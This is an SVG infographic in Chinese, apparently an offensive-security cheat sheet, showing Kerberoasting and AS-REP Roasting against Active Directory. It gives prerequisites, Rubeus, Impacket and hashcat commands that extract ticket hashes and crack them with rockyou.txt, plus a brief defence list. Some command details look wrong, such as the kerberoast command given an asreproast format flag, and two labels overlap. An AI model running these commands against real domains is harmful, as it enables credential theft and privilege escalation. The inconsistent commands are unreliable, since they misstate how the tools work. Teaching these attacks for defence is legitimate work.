<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 460" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="460" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">Kerberoasting 与 AS-REP Roasting 实战</text>

  <rect x="40" y="70" width="180" height="60" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="130" y="102" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">Kerberoasting</text>
  <text x="130" y="120" font-size="9" text-anchor="middle" fill="#c53030">TGS 票据破解</text>

  <rect x="240" y="70" width="180" height="60" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="330" y="102" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">AS-REP Roasting</text>
  <text x="330" y="120" font-size="9" text-anchor="middle" fill="#b7791f">TGT 票据破解</text>

  <rect x="440" y="70" width="180" height="60" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="530" y="102" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">Rubeus</text>
  <text x="530" y="120" font-size="9" text-anchor="middle" fill="#805ad5">票据操作工具</text>

  <rect x="640" y="70" width="180" height="60" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="730" y="102" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">hashcat</text>
  <text x="730" y="120" font-size="9" text-anchor="middle" fill="#38a169">GPU 破解</text>

  <rect x="840" y="70" width="120" height="60" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="900" y="102" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">提权</text>

  <rect x="40" y="155" width="460" height="280" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="180" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">Kerberoasting 实战</text>

  <text x="70" y="210" font-size="10" font-weight="bold" fill="#c53030">前提：</text>
  <text x="70" y="230" font-size="9" fill="#2d3748">有域用户权限（普通域账号即可）</text>
  <text x="70" y="250" font-size="9" fill="#2d3748">目标 SPN 服务使用弱密码</text>

  <text x="70" y="280" font-size="10" font-weight="bold" fill="#805ad5">Rubeus：</text>
  <text x="70" y="300" font-size="9" fill="#2d3748">Rubeus.exe kerberoast /format:asreproast</text>

  <text x="70" y="330" font-size="10" font-weight="bold" fill="#dd6b20">hashcat：</text>
  <text x="70" y="350" font-size="9" fill="#2d3748">hashcat -m 13100 tgs.out rockyou.txt</text>

  <text x="70" y="380" font-size="10" font-weight="bold" fill="#3182ce">Impacket：</text>
  <text x="70" y="400" font-size="9" fill="#2d3748">getTGS.py domain/user /spn:HTTP/target</text>
  <text x="70" y="420" font-size="9" fill="#2d3748">→ 输出 hash → hashcat 破解</text>

  <text x="70" y="440" font-size="10" font-weight="bold" fill="#38a169">原理：</text>
  <text x="70" y="440" font-size="9" fill="#2d3748">普通域用户可请求任意 SPN 的 TGS</text>

  <rect x="520" y="155" width="440" height="280" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="180" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">AS-REP Roasting</text>

  <text x="550" y="210" font-size="10" font-weight="bold" fill="#c53030">前提：</text>
  <text x="550" y="230" font-size="9" fill="#2d3748">目标账户未启用 Kerberos 预认证</text>
  <text x="550" y="250" font-size="9" fill="#2d3748">无需任何域账号（匿名可操作）</text>

  <text x="550" y="280" font-size="10" font-weight="bold" fill="#805ad5">Rubeus：</text>
  <text x="550" y="300" font-size="9" fill="#2d3748">Rubeus.exe asreproast /format:asreproast</text>

  <text x="550" y="330" font-size="10" font-weight="bold" fill="#dd6b20">hashcat：</text>
  <text x="550" y="350" font-size="9" fill="#2d3748">hashcat -m 18200 asrep.out rockyou.txt</text>

  <text x="550" y="380" font-size="10" font-weight="bold" fill="#3182ce">防御：</text>
  <text x="550" y="400" font-size="9" fill="#2d3748">强制启用 Kerberos 预认证</text>
  <text x="550" y="420" font-size="9" fill="#2d3748">使用强密码（16位+大小写+特殊）</text>
  <text x="550" y="440" font-size="9" fill="#2d3748">监控异常 TGS 请求</text>
</svg>
